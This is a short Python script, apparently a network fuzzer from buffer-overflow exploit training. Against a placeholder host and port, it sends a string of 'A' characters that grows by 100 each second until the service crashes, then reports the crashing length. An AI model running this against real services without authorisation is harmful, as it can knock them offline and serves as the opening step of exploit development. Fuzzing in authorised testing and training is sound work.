import sys , socket 
from time import sleep

buffer = "A" * 100

while True:
	try:
		payload= buffer + '\r\n'
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('x.x.x.x',xxxx))
		print( "[+] sending payload....\n" + str(len(buffer)))
		s.send((payload.encode()))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100

	
	except:
		print ("fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()

